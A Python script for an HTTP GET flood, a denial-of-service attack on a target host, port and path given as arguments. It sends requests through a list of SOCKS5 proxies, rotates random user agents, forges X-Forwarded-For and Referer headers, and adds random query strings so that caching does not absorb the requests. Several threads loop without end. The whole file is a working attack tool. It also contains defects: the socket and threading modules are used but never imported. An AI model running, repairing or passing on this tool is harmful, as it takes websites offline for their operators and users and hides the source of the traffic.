import ssl
import multiprocessing
import random
import time
import sys
import socks # pysocks
from fake_useragent import UserAgent # fake-useragent
 
# Init
 
targetHost = sys.argv[1]
targetPort = int(sys.argv[2])
threadNumber = int(sys.argv[3])
targetPath = sys.argv[4]
rI = random.randint
rC = random.choice
queryParams = [
    "s",
    "a",
    "q",
    "id",
    "page",
    "search",
    "controller",
    "language",
    "data",
    "field"
]
time.sleep(1)
def Flood(indexPicker):
    if indexPicker < len(proxies):
        proxy = proxies[indexPicker].strip().split(":")
    else:
        proxy = rC(proxies).strip().split(":")
    if indexPicker < len(userAgentList):
        userAgent = userAgentList[indexPicker]
    else:
        userAgent = rC(userAgentList)
    Connection = "Connection: Keep-Alive\r\n"
    Accept = "Accept: */*\r\n"
    Referer = "Referer: https://google.com?q=" + targetHost + "\r\n"
    X_Forwarded_For = f"X-Forwarded-For: {proxy[0]}, {proxy[0][::-1]}\r\n"
    User_Agent = "User-Agent: " + userAgent + "\r\n\r\n"
    while True:
        try:
            socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((targetHost, targetPort))
            if targetPort == 443:
                sslContext = ssl.SSLContext()
                s = sslContext.wrap_socket(s, server_hostname=targetHost)
            for _ in range(100):
                valueParams = f"?{rC(queryParams)}={rI(1, 65535)}&{rC(queryParams)}={rI(1, 65535)}"
                floodHeader = f"GET {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
                s.send(str(floodHeader).encode())
            s.close()
            print("Flood sent " + proxy[0] + ":" + proxy[1])
        except:
            pass
 
proxies = open("socks5.txt").readlines()

userAgentList = []
for _ in range(100):
    userAgent = UserAgent().random
    userAgentList.append(userAgent)
for indexPicker in range(threadNumber):
    thread = threading.Thread(target=Flood, args=(indexPicker, ))
    thread.setDaemon = True
    thread.start()
